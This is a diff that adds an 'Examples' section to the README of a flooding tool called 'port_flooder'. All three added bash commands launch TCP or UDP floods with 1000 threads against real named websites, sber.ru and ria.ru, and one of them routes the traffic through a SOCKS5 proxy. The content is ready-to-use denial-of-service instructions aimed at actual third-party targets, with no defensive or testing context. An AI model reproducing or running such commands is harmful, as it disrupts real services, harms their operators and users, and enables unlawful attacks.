@@ -64,3 +64,17 @@ Options:
  --proxyuser|-U     <user>      proxy username
  --proxypassword|-P <password>  password of proxy user
  ```
+
+# Examples
+
+```bash
+./port_flooder -m TCP -t http://sber.ru -T 1000 -a 100 -d http_header.txt -p socks5://proxy.com -s SOCK5
+```
+
+```bash
+./port_flooder -m TCP -t http://ria.ru -T 1000 -a 10
+```
+
+```bash
+./port_flooder -m UDP -t http://ria.ru -T 1000 -a 10 -d http_header.txt
+```
